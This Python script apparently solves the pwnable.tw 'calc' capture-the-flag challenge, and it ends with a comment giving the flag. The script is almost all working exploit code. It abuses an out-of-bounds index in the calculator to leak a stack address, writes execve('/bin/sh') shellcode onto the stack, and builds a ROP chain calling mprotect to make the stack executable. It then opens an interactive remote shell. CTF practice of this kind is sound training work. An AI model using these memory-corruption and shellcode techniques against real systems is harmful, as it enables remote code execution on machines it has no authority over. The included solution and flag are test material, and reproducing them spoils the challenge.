# first send +357 to leak canary
# 1428 / 4
# 0xffffcf48 (int pool) -0xffffd4dc (canary)
# layout
# [ pool (4 bytes) ]
# [ array          ]
# [ .....          ]
# [  100 * 4 bytes ]

# send +361
# return address of 'calc' stack
# 1444 / 4

# send +360 for ebp
# send +368 for [ebp]

# shellcode from http://shell-storm.org/shellcode/files/shellcode-811.php

import socket
import struct
import telnetlib

# SERVER = ('localhost', 1234)
SERVER = ('chall.pwnable.tw', 10100)

def endian_fix(num):
    return struct.unpack('<I',
            struct.pack('<i', num))[0]

def send_and_recv(buf):
    s.send(buf)
    data = s.recv(1024)
    data = int(data)
    data = endian_fix(data)
    return data

def write(what, where, op='+'):
    buf = bytes('+{}\n'.format(where), 'utf-8')
    cur = send_and_recv(buf)
    buf = bytes('+{}-{}\n'.format(where, cur), 'utf-8')
    cur = send_and_recv(buf)
    assert(cur == 0)
    buf = bytes('+{}{}{}\n'.format(where, op, what), 'utf-8')
    cur = send_and_recv(buf)
    #assert(cur == what)

def add(what, where):
    buf = bytes('+{}+{}\n'.format(where, what), 'utf-8')
    cur = send_and_recv(buf)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(SERVER)
s.recv(1024)


stack = send_and_recv(b'+360\n')
print('[+] Stack address: {}'.format(hex(stack)))

# write shellcode to stack
print('[+] Writing shellcode to stack')
write(0x6850c031, 368)
write(0x68732f2f, 369)
write(0x69622f68, 370)
write(0x89e3896e // 2, 371)
add(0x89e3896e // 2, 371)
write(0xb0c289c1 // 2, 372)
add(0xb0c289c1 // 2 + 1, 372)
write(0x3180cd0b, 373)
write(0x80cd40c0 // 2, 374)
add(0x80cd40c0 // 2, 374)

# write rop chain
print('[+] Remapping stack as rwx')
write(0x806f1f0, 361)                   # mprotect
write(stack // 2, 362)                  # stack address (with shellcode)
add(stack // 2, 362)
write((stack & ~0xfff) // 2, 363)       # stack address (to remap as rwx)
add((stack & ~0xfff) // 2, 363)
write(0x1000, 364)                      # size
write(0x6, 365)                         # r | w | x

print('[+] Jumping to shellcode')
s.send(b'\n')

print('[+] Spawning shell!')
t = telnetlib.Telnet()
t.sock = s
t.interact()
s.close()

# FLAG{C:\Windows\System32\calc.exe}
